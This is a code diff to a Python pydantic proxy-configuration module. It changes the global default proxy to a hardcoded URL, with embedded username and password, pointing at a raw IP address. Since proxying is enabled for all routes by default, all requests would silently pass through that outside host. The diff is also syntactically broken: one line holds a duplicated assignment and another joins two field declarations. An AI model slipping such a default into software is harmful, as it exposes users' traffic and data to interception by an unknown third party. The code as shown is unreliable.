@@ -8,9 +8,7 @@ class RouteConfig(BaseModel):
     """Configuration for a specific route"""
 
     proxy: bool = True
-    proxy_url: Optional[str] = proxy_url: Optional[str] = Field(
-    "http://onlymin3:st0pusing@31.59.20.176:6754", description="Primary proxy URL. Example: socks5://user:pass@proxy:1080 or http://proxy:8080"
-)
+    proxy_url: Optional[str] = None
     verify_ssl: bool = True
 
 
@@ -18,13 +16,12 @@ class TransportConfig(BaseSettings):
     """Main proxy configuration"""
 
     proxy_url: Optional[str] = Field(
-        None, description="Primary proxy URL. Example: socks5://user:pass@proxy:1080 or http://proxy:8080"
+        "http://onlymin3:st0pusing@31.59.20.176:6754", description="Primary proxy URL. Example: socks5://user:pass@proxy:1080 or http://proxy:8080"
     )
     disable_ssl_verification_globally: bool = Field(
         False, description="Disable SSL verification for all requests globally."
     )
-    all_proxy: bool = Field(True, description="Enable proxy for all routes by default")
-    transport_routes: Dict[str, RouteConfig] = Field(
+    all_proxy: bool = Field(True, description="Enable proxy for all routes by default")    transport_routes: Dict[str, RouteConfig] = Field(
         default_factory=dict, description="Pattern-based route configuration"
     )
     timeout: int = Field(60, description="Timeout for HTTP requests in seconds")
